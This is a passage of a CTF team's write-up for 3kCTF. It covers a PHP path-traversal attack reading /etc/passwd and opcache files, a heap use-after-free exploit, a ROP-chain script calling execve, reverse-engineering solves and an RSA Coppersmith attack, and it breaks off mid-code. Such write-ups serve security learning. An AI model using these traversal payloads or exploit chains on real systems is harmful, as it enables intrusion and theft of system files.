<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">curl <span style="color:#e6db74">&#34;http://carthagods.3k.ctf.to:8039/index.php?eba1b61134bf5818771b8c3203a16dc9=../../../../../etc/passwd&#34;</span></code></pre></div><pre><code>root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
...</code></pre>
<p>However we cannot print the content of <code>flag.php</code> directly</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">curl <span style="color:#e6db74">&#34;http://carthagods.3k.ctf.to:8039/index.php?eba1b61134bf5818771b8c3203a16dc9=../flag.php&#34;</span></code></pre></div><pre><code>&lt;textarea class=&#34;label-input100&#34; style=&#34;color:black;width: 100%;height: 300px;&#34;&gt;php content detected             &lt;/textarea&gt;</code></pre>
<p>From the phpinfo provided we can know opcache is enabled, with <code>opcache.file_cache</code> set to <code>/var/www/cache/</code>. Maybe we can get the compiled version of <code>flag.php</code> and get its content.</p>

<p>The opcache will store the cache in the format <code>/var/www/cache/&lt;system_id&gt;/path/to/file.php.bin</code>, with system ID generated from PHP version, Zend version etc. Therefore, I spin up a Ubuntu VM and install the same version of php, enable opcache to get the same system ID.</p>

<p>The system ID is: <code>e2c6579e4df1d9e77e36d2f4ff8c92b3</code></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">curl <span style="color:#e6db74">&#34;http://carthagods.3k.ctf.to:8039/index.php?eba1b61134bf5818771b8c3203a16dc9=../../../../var/www/cache/e2c6579e4df1d9e77e36d2f4ff8c92b3/var/www/html/flag.php.bin&#34;</span> --output -</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">...
&lt;<span style="color:#f92672">textarea</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;label-input100&#34;</span> <span style="color:#a6e22e">style</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;color:black;width: 100%;height: 300px;&#34;</span>&gt;OPCACHEe2c6579e4df1d9e77e36d2f4ff8c92b3�x��_Jqҍ@������������������������_���Ӛ��_/var/www/html/flag.php������/var/www/html/flag.php1����q��������d!=
VPyi0���Y�Į��{�opcache_get_statush���JK��<span style="color:#960050;background-color:#1e0010">&amp;</span>3k{Hail_the3000_years_7hat_are_b3h1nd}`Lq�(��&lt;<span style="color:#f92672">iframe</span> <span style="color:#a6e22e">width</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;560&#34;</span> <span style="color:#a6e22e">height</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;315&#34;</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;https://www.youtube.com/embed/y8zZXMLBin4&#34;</span> <span style="color:#a6e22e">frameborder</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;0&#34;</span> <span style="color:#a6e22e">allow</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture&#34;</span> <span style="color:#a6e22e">allowfullscreen</span>&gt;&lt;/<span style="color:#f92672">iframe</span>&gt;֖|�flag                                          &lt;/<span style="color:#f92672">textarea</span>&gt;
...</code></pre></div>
<h2 id="linker-pwn-493-points">linker (Pwn; 493 points)<a hidden class="anchor" aria-hidden="true" href="#linker-pwn-493-points">#</a></h2>

<p>Solved by <em>cire meat pop</em>.</p>

<h3 id="program">Program<a hidden class="anchor" aria-hidden="true" href="#program">#</a></h3>
<pre><code>root@kali:~/3kctf/linker# ./linker
Welcome to your secret journal!
Provide name size:
8
Provide a name:
abcd
Welcome abcd
! What would you like to do?
1- Get new blank page
2- Edit page content
3- Empty a page
4- Relogin
5- Exit
&gt; </code></pre>
<p>This seems to be a heap challenge, which allow user to <em>create</em>, <em>edit</em> and <em>free</em> a chunk. Also, it provides a weird function (i.e., <em>relogin</em>) for changing the name which does nothing to the other functions, and usually means it will be used for later exploit.</p>

<h3 id="vulnerability">Vulnerability<a hidden class="anchor" aria-hidden="true" href="#vulnerability">#</a></h3>

<p>In <code>3- Empty a page</code>:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">puts(<span style="color:#e6db74">&#34;Provide page index:&#34;</span>);
read(<span style="color:#ae81ff">0</span>, <span style="color:#f92672">&amp;</span>buf, <span style="color:#ae81ff">4uLL</span>);
idx <span style="color:#f92672">=</span> atoi(<span style="color:#f92672">&amp;</span>buf);
<span style="color:#66d9ef">if</span> ( idx <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">||</span> idx <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">4</span> )
{
  puts(<span style="color:#e6db74">&#34;Wrong index kiddo...&#34;</span>);
}
<span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> ( check_pages[idx] )
{
  free(pages[idx]);
  check_pages[idx] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; <span style="color:#75715e">// vuln
</span><span style="color:#75715e"></span>  <span style="color:#f92672">--</span>number_pages;
}</code></pre></div>
<p>After freed a chunk, only the <code>check[idx]</code> is set to 0; and in <em>Edit page content</em>:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">puts(<span style="color:#e6db74">&#34;Provide page index:&#34;</span>);
read(<span style="color:#ae81ff">0</span>, <span style="color:#f92672">&amp;</span>buf, <span style="color:#ae81ff">4uLL</span>);
idx <span style="color:#f92672">=</span> atoi(<span style="color:#f92672">&amp;</span>buf);
<span style="color:#66d9ef">if</span> ( idx <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">||</span> idx <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">4</span> )
{
  puts(<span style="color:#e6db74">&#34;Wrong index kiddo...&#34;</span>);
}
<span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> ( pages[idx] ) <span style="color:#75715e">// not checked
</span><span style="color:#75715e"></span>{
  puts(<span style="color:#e6db74">&#34;Provide new page content:&#34;</span>);
  read(<span style="color:#ae81ff">0</span>, pages[idx], (<span style="color:#66d9ef">int</span>)page_size[idx]);
}</code></pre></div>
<p>Edit function won't check <code>check[idx]</code>, which means we can overwrite a free chunk.</p>

<h3 id="exploit-1">Exploit<a hidden class="anchor" aria-hidden="true" href="#exploit-1">#</a></h3>

<p>As we can overwrite any data into the free chunk, we can perform some attack to overwrite <code>__malloc_hook</code> or <code>__free_hook</code> with one gadget rce.</p>

<p>However, we had two problems.</p>

<ul>
<li>tcache techniques won't work with calloc

<ul>
<li>Solution: We filled up tcache and perform fastbin attack.</li>
</ul></li>
<li>Theres are no show functions to leak libc addresses

<ul>
<li>Solution: We utilize unsorted bin attack to write unsorted bin address to <code>name</code>, then <em>relogin</em> to print the content of <code>name</code>.</li>
</ul></li>
</ul>

<h3 id="problem">Problem<a hidden class="anchor" aria-hidden="true" href="#problem">#</a></h3>

<p><code>can't access tty; job control turned off</code></p>

<p>Will this means we can't open the shell? Whatever, we change the approach from utilizing one gadget RCE to calling the <code>system</code> function.
We can overwrite <code>__free_hook</code> with <code>system</code>, then free a chunk with content <code>/bin/cat flag</code>, yielding <code>system(&quot;/bin/cat flag&quot;)</code>. However, if we want control <code>__free_hook</code>, we need to try harder.
Finally, we perform fastbin attack to control <code>pages</code> and <code>check_pages</code>, edit the pointer of each page to an arbitrary address, and eventually we have arbitrary address write.</p>

<p><code>3k{unlink_the_world_and_feel_the_void}</code></p>

<h2 id="one-and-a-half-man-pwn-493-points">one and a half man (Pwn; 493 points)<a hidden class="anchor" aria-hidden="true" href="#one-and-a-half-man-pwn-493-points">#</a></h2>

<p>Solved by <em>cire meat pop</em>.</p>

<h3 id="program-1">Program<a hidden class="anchor" aria-hidden="true" href="#program-1">#</a></h3>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">ssize_t <span style="color:#a6e22e">vuln</span>()
{
  <span style="color:#66d9ef">char</span> buf; <span style="color:#75715e">// [rsp+6h] [rbp-Ah]
</span><span style="color:#75715e"></span>
  <span style="color:#66d9ef">return</span> read(<span style="color:#ae81ff">0</span>, <span style="color:#f92672">&amp;</span>buf, <span style="color:#ae81ff">0xAAuLL</span>);
}</code></pre></div>
<p>This is a short function that obviously vulnerable to buffer overflow.
I have solved similar challenge before, and my approach was to overwrite first 2 byte the <code>read_got</code> to run one gadget RCE. It involves 4 bit randomness to satisfy, hence I have a 1/16 chance to solving it.
<strong>It works</strong>, but <code>can't access tty; job control turned off</code>. Okay, I shouldn't forgot shell interaction is disabled from this server.</p>

<h3 id="exploit-2">Exploit<a hidden class="anchor" aria-hidden="true" href="#exploit-2">#</a></h3>

<p>I find a <code>syscall</code> near the one gadget RCE so that we can jump to syscalls. It's time to construct ROP:</p>
<pre><code>mov eax, 0 ; pop rbp ; ret           g1(in binary)
mov edx, eax ; mov eax, edx ; ret      (in libc)
pop rdi; ret                           (in binary)
pop rsi; pop r15; ret                  (in binary)
move eax, 0x3b; syscall                (in libc)</code></pre>
<p>By this ROP chain we can set <code>edx</code> (the third argument) to 0, control <code>rdi</code> and <code>rsi</code> (the first and the second arguments) and call <code>sys_execve</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">sys_execve(<span style="color:#f92672">*</span>filename, argv[], envp[])</code></pre></div>
<p>To <code>cat flag</code>:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">sys_execve(<span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#f92672">/</span>bin<span style="color:#f92672">/</span>cat<span style="color:#960050;background-color:#1e0010">&#39;</span>, [<span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#f92672">/</span>bin<span style="color:#f92672">/</span>cat<span style="color:#960050;background-color:#1e0010">&#39;</span>, <span style="color:#960050;background-color:#1e0010">&#39;</span>flag<span style="color:#960050;background-color:#1e0010">&#39;</span>], <span style="color:#ae81ff">0</span>)</code></pre></div>
<p>Finally our script:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;a&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">18</span> <span style="color:#f92672">+</span> flat(pop_rsi_r15, buf, <span style="color:#ae81ff">0</span>, read_plt, vuln)
p<span style="color:#f92672">.</span>send(payload)
sleep(<span style="color:#ae81ff">0.5</span>)
string <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/bin/cat&#34;</span><span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">0x10</span>,<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>)<span style="color:#f92672">+</span>p64(buf)<span style="color:#f92672">+</span>p64(buf<span style="color:#f92672">+</span><span style="color:#ae81ff">0x28</span>) \
            <span style="color:#f92672">+</span>p64(<span style="color:#ae81ff">0</span>)<span style="color:#f92672">+</span><span style="color:#e6db74">&#34;flag&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">4</span>
p<span style="color:#f92672">.</span>send(string)
sleep(<span style="color:#ae81ff">0.5</span>)

payload2 <span style="color:#f92672">=</span> flat(pop_rsi_r15, setvbuf_got, <span style="color:#ae81ff">0</span>, read_plt, pop_rsi_r15, read_got, \
                <span style="color:#ae81ff">0</span>, read_plt, g1, buf, setvbuf_plt, pop_rdi, buf, pop_rsi_r15, \
                buf<span style="color:#f92672">+</span><span style="color:#ae81ff">0x10</span>, <span style="color:#ae81ff">0</span>, read_plt)
                ret
p<span style="color:#f92672">.</span>send(<span style="color:#e6db74">&#34;a&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">18</span> <span style="color:#f92672">+</span> payload2)
sleep(<span style="color:#ae81ff">0.5</span>)
p<span style="color:#f92672">.</span>send(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x5b\xd6</span><span style="color:#e6db74">&#34;</span>) <span style="color:#75715e"># (in libc) mov edx, eax ; mov eax, edx ; ret</span>
sleep(<span style="color:#ae81ff">0.5</span>)
p<span style="color:#f92672">.</span>send(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x72\x04</span><span style="color:#e6db74">&#34;</span>) <span style="color:#75715e"># (in libc) move eax, 0x3b; syscall</span>
sleep(<span style="color:#ae81ff">0.5</span>)

p<span style="color:#f92672">.</span>interactive()</code></pre></div>
<p><code>3k{one_byte_and_a_half_overwrite_ftw!}</code></p>

<h2 id="microscopic-reverse-488-points">microscopic (Reverse; 488 points)<a hidden class="anchor" aria-hidden="true" href="#microscopic-reverse-488-points">#</a></h2>

<p>Solved by <em>Mystiz</em>.</p>

<p>Open with IDA pro. There is a curious function defined on <code>sub_F7C</code>:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cpp" data-lang="cpp"><span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int64</span> <span style="color:#66d9ef">__fastcall</span> <span style="color:#a6e22e">sub_F7C</span>(<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> a1)
{
  <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">3</span><span style="color:#f92672">:</span>
    <span style="color:#75715e">// ...
</span><span style="color:#75715e"></span>    <span style="color:#75715e">// v3 hereby is the length of the length of the target ciphertext
</span><span style="color:#75715e"></span>    ciphertext[v2] <span style="color:#f92672">=</span> (v3 <span style="color:#f92672">^</span> input[v12]) <span style="color:#f92672">+</span> v2;
    <span style="color:#75715e">// ...
</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">break</span>;
  <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">4</span><span style="color:#f92672">:</span>
    <span style="color:#75715e">// ...
</span><span style="color:#75715e"></span>    v9 <span style="color:#f92672">=</span> ciphertext[v12] <span style="color:#f92672">!=</span> target_ciphertext[v12];
    <span style="color:#75715e">// ...
</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">break</span>;
}
</code></pre></div>
<p>Hereby <code>target_ciphertext</code> is is an array of 39 integers, located on <code>0x202020</code>. We can simply write a Python script that extract <code>target_ciphertext</code> and compute the corresponding input.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">elf <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;challenge/micro&#39;</span>)
target <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>read(<span style="color:#ae81ff">0x202020</span>, <span style="color:#ae81ff">39</span><span style="color:#f92672">*</span><span style="color:#ae81ff">4</span>)
target <span style="color:#f92672">=</span> [unpack(<span style="color:#e6db74">&#39;I&#39;</span>, target[<span style="color:#ae81ff">4</span><span style="color:#f92672">*</span>i:<span style="color:#ae81ff">4</span><span style="color:#f92672">*</span>i<span style="color:#f92672">+</span><span style="color:#ae81ff">4</span>])[<span style="color:#ae81ff">0</span>] <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">39</span>)]

target <span style="color:#f92672">=</span> [(c<span style="color:#f92672">-</span>i)<span style="color:#f92672">^</span><span style="color:#ae81ff">39</span> <span style="color:#66d9ef">for</span> i, c <span style="color:#f92672">in</span> enumerate(target)]
<span style="color:#66d9ef">print</span>(bytes(target))
<span style="color:#75715e"># 3k{nan0mites_everywhere_everytime_ftw!}</span></code></pre></div>
<h2 id="game-reversemisc-486477-points">game (Reverse/Misc; 486+477 points)<a hidden class="anchor" aria-hidden="true" href="#game-reversemisc-486477-points">#</a></h2>

<p>Solved by <em>eriri</em>.</p>
<pre><code>game 1
find your way to the heart of the maze

game 2
the shortest route is often the best</code></pre>
<p>You are given an Unity game folder at the beginning. When you start the game, you are in a dark maze. You can walk but not jump nor run. Nothing will be triggered when you walk out of the maze.</p>

<p>I think there should be multiple ways to solve the challenge. One solution will be <em>physcially</em> break the maze. How to do that? By deleting the walls object in the level.</p>

<p>With <a href="https://github.com/DerPopo/UABE">Unity Assets Bundle Extractor</a>, we are able to delete walls in <code>/CTF_Data/level0</code> (which is level of the maze).
<figure><img src="https://i.imgur.com/1qIvga0.png" alt=""></figure></p>

<p>After deleting some of the wall objects (for me I selected the <code>GameObject Wall</code> with number greater than 100) and returning to the game, you will find a wall that marks the flag for <code>game 2</code>:</p>

<p><figure><img src="https://i.imgur.com/CijVLag.png" alt=""></figure></p>

<p>There are some characters missing in the wall because we deleted some of the characters by accident. We did a bit of guess and finally got the flag: <code>3K-CTF-A-MAZE-ING</code>.</p>

<p>There are also some <em>floating</em> walls inside the maze. When you walk through it you will get a word overlayed on the top left corner.
<figure><img src="https://i.imgur.com/AanPBXV.png" alt=""></figure></p>

<p>Decompiling <code>/CTF_Data/Managed/Assembly-CSharp.dll</code> will get you the logic of the game.
<figure><img src="https://i.imgur.com/AwL6Bub.png" alt=""></figure>
If you find and hit the 6 walls with the right order (I guess it should be the shortest path from the starting point to the flag room), the game will output you a flag. If not, an error message will be displayed.
<figure><img src="https://i.imgur.com/jnBf3T6.png" alt=""></figure></p>

<p>Here in UABE we found 6 assets with duplicated names. It should correspond to the 6 floating walls in the game.
<figure><img src="https://i.imgur.com/uHAzYbC.png" alt=""></figure></p>

<p>After some tries (with a bit of luck), we were able to get the flag for <code>game 1</code>.
<figure><img src="https://i.imgur.com/cgF7eDj.jpg" alt=""></figure></p>

<p>Flag: <code>3K-CTF-GamingIsNotACrime</code>.</p>

<p>Reference: <a href="https://github.com/imadr/Unity-game-hacking">https://github.com/imadr/Unity-game-hacking</a></p>

<h2 id="pyzzle-reversemisccrypto-459479-points">pyzzle (Reverse/Misc/Crypto; 459+479 points)<a hidden class="anchor" aria-hidden="true" href="#pyzzle-reversemisccrypto-459479-points">#</a></h2>

<p>Solved by <em>crabmony</em> and <em>Mystiz</em>.</p>

<h3 id="part-1">Part 1<a hidden class="anchor" aria-hidden="true" href="#part-1">#</a></h3>

<p>We are given a concrete syntax tree that is from <a href="https://github.com/Instagram/LibCST">LibCST</a>.</p>

<p>We referred to the documentation and traverse the tree manually. Eventually we have manually parsed the tree into a Python script:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> binascii

plaintext <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;REDACTED&#39;</span>

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">exor</span>(a, b):
    temp <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(n):
        <span style="color:#66d9ef">if</span> a[i] <span style="color:#f92672">==</span> b[i]:
            temp <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
        <span style="color:#66d9ef">else</span>:
            temp <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
    <span style="color:#66d9ef">return</span> temp

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">BinaryToDecimal</span>(binary):
    string <span style="color:#f92672">=</span> int(binary, <span style="color:#ae81ff">2</span>)
    <span style="color:#66d9ef">return</span> string

PT_Ascii <span style="color:#f92672">=</span> [ord(x) <span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> plaintext]
PT_Bin <span style="color:#f92672">=</span> [format(y, <span style="color:#e6db74">&#39;08b&#39;</span>) <span style="color:#66d9ef">for</span> y <span style="color:#f92672">in</span> PT_Ascii]
PT_Bin <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">.</span>join(PT_Bin)
n <span style="color:#f92672">=</span> <span style="color:#ae81ff">26936</span>
K1 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;...&#39;</span> <span style="color:#75715e"># Redacted as this binary string is too long.</span>
K2 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;...&#39;</span> <span style="color:#75715e"># Ditto</span>
L1 <span style="color:#f92672">=</span> PT_Bin[:n]
R1 <span style="color:#f92672">=</span> PT_Bin[n:]
f1 <span style="color:#f92672">=</span> exor(R1,K1)
R2 <span style="color:#f92672">=</span> exor(f1, L1)
L2 <span style="color:#f92672">=</span> R1
f2 <span style="color:#f92672">=</span> exor(R2, K2)
R3 <span style="color:#f92672">=</span> exor(f2, L2)
L3 <span style="color:#f92672">=</span> R2
R3 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;...&#39;</span> <span style="color:#75715e"># Ditto</span>
L3 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;...&#39;</span> <span style="color:#75715e"># Ditto</span>
cipher <span style="color:#f92672">=</span> L3 <span style="color:#f92672">+</span> R3
plaintext <span style="color:#f92672">=</span> L6 <span style="color:#f92672">+</span> R6
plaintext <span style="color:#f92672">=</span> int(plaintext, <span style="color:#ae81ff">2</span>)
plaintext <span style="color:#f92672">=</span> binascii<span style="color:#f92672">.</span>unhexlify(<span style="color:#e6db74">&#39;</span><span style="color:#e6db74">%x</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">%</span> plaintext)
<span style="color:#66d9ef">print</span>(plaintext)</code></pre></div>
<p>Since we are given everything (except the plaintext), we are able to recover the plaintext by reversing the operations. We ended up with a STP file that contains the flag: <code>3k{almost_done_shizzle_up_my_nizzle}</code>.</p>

<h3 id="part-2">Part 2<a hidden class="anchor" aria-hidden="true" href="#part-2">#</a></h3>

<p>From the STP file, apart from the flag, we have a bunch of nodes and edges. This part we are connecting the dots with Python:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">parse_line</span>(line):
  <span style="color:#66d9ef">return</span> list(map(int, line<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39; &#39;</span>)[<span style="color:#ae81ff">1</span>:]))

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">main</span>():
  <span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#39;pyzzle2&#39;</span>) <span style="color:#66d9ef">as</span> f:
    lines <span style="color:#f92672">=</span> f<span style="color:#f92672">.</span>read()<span style="color:#f92672">.</span>strip()<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)
  
  edges <span style="color:#f92672">=</span> list(map(parse_line, lines[<span style="color:#ae81ff">8</span>:<span style="color:#ae81ff">124</span>]))
  points <span style="color:#f92672">=</span> list(map(parse_line, lines[<span style="color:#ae81ff">127</span>:<span style="color:#ae81ff">271</span>]))
  point_map <span style="color:#f92672">=</span> {}
  <span style="color:#66d9ef">for</span> id, x, y <span style="color:#f92672">in</span> points:
    point_map[id] <span style="color:#f92672">=</span> (x, y)

  im <span style="color:#f92672">=</span> Image<span style="color:#f92672">.</span>new(<span style="color:#e6db74">&#39;1&#39;</span>, (<span style="color:#ae81ff">1850</span>, <span style="color:#ae81ff">110</span>), color<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>)
  draw <span style="color:#f92672">=</span> ImageDraw<span style="color:#f92672">.</span>Draw(im)
  
  <span style="color:#66d9ef">for</span> id1, id2, _ <span style="color:#f92672">in</span> edges:
    x1, y1 <span style="color:#f92672">=</span> point_map<span style="color:#f92672">.</span>get(id1)
    x2, y2 <span style="color:#f92672">=</span> point_map<span style="color:#f92672">.</span>get(id2)
    draw<span style="color:#f92672">.</span>line((x1, y1, x2, y2), fill<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>)

  im<span style="color:#f92672">.</span>save(<span style="color:#e6db74">&#39;flag.png&#39;</span>)

main()</code></pre></div>
<p><figure><img src="https://i.imgur.com/MNaoisT.png" alt=""></figure></p>

<p>Flag: <code>3K-PYZZLE_FO_SHIZZLE_MY_NIZZLE</code>.</p>

<h2 id="a-hundred-friends-crypto-496-points">A hundred friends (Crypto; 496 points)<a hidden class="anchor" aria-hidden="true" href="#a-hundred-friends-crypto-496-points">#</a></h2>

<p>Solved by <em>Mystiz</em>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">key <span style="color:#f92672">=</span> RSA<span style="color:#f92672">.</span>generate(<span style="color:#ae81ff">1024</span>)
pad <span style="color:#f92672">=</span> random<span style="color:#f92672">.</span>randint(<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">2</span><span style="color:#f92672">**</span>UPPER_BOUND)
exp <span style="color:#f92672">=</span> random<span style="color:#f92672">.</span>randint(<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">3</span>)
c <span style="color:#f92672">=</span> pow(m<span style="color:#f92672">**</span>exp <span style="color:#f92672">+</span> pad, <span style="color:#ae81ff">3</span>, key<span style="color:#f92672">.</span>n)</code></pre></div>
<p>This is a challenge similar to Multicast in PlaidCTF 2017.
Theoretically, we should be able to recover the original message with 3 ciphertexts, assuming that those ciphertexts are encrypted with <code>exp = 1</code>.</p>

<p>We have written the core logic to retrieve the message, given some ciphertexts:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">attempt</span>(subpairs):
  n <span style="color:#f92672">=</span> len(subpairs)

  <span style="color:#75715e"># (m + pi)^3 = ci (mod ni)</span>
  cs <span style="color:#f92672">=</span> list(map(<span style="color:#66d9ef">lambda</span> pair: pair[<span style="color:#ae81ff">0</span>], subpairs))
  ns <span style="color:#f92672">=</span> list(map(<span style="color:#66d9ef">lambda</span> pair: pair[<span style="color:#ae81ff">1</span>], subpairs))
  ps <span style="color:#f92672">=</span> list(map(<span style="color:#66d9ef">lambda</span> pair: pair[<span style="color:#ae81ff">2</span>], subpairs))
  nprod <span style="color:#f92672">=</span> reduce(mul, ns)

  gs <span style="color:#f92672">=</span> [[<span style="color:#ae81ff">0</span> <span style="color:#66d9ef">for</span> _ <span style="color:#f92672">in</span> range(n)] <span style="color:#66d9ef">for</span> _ <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">3</span><span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>)]
  <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(n):
    <span style="color:#66d9ef">for</span> j <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">3</span><span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>):
      gs[j][i] <span style="color:#f92672">=</span> binomial(<span style="color:#ae81ff">3</span>, j) <span style="color:#f92672">*</span> pow(ps[i], j, nprod) <span style="color:#f92672">%</span> ns[i]
    gs[<span style="color:#ae81ff">3</span>][i] <span style="color:#f92672">=</span> ((gs[<span style="color:#ae81ff">3</span>][i] <span style="color:#f92672">-</span> cs[i]) <span style="color:#f92672">%</span> ns[i] <span style="color:#f92672">+</span> ns[i]) <span style="color:#f92672">%</span> ns[i]

  gg <span style="color:#f92672">=</span> [int(crt(gs[i], ns)) <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">3</span><span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>)]
  
  <span style="color:#75715e"># Defines e, Zn = Zmod(nprod) and the parameters for the</span>
  <span style="color:#75715e"># Coppersmith&#39;s attack here. Omitted</span>

  roots <span style="color:#f92672">=</span> coppersmith_howgrave_univariate(pol, nprod, beta, mm, tt, XX)
  <span style="color:#66d9ef">if</span> len(roots) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span>:
    <span style="color:#66d9ef">return</span> roots[<span style="color:#ae81ff">0</span>]</code></pre></div>
<p>(Some functions are copied from <a href="https://github.com/mimoo/RSA-and-LLL-attacks/blob/master/coppersmith.sage">mimoo/RSA-and-LLL-attacks</a>. They are not included here for simplicity)</p>

<p>However, we are unable to recover the message from sampling three ciphertexts in 100 rounds (it should happen in around 27 rounds). The reason is the message isn't small enough for Coppersmith's attack. Hence, we are sampling more ciphertexts (from 3 to 5) and the attack worked:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">n <span style="color:#f92672">=</span> <span style="color:#ae81ff">5</span>
attempt_count <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
<span style="color:#66d9ef">while</span> True:
  random<span style="color:#f92672">.</span>shuffle(pairs)
  subpairs <span style="color:#f92672">=</span> pairs[:n]
  attempt_count <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>
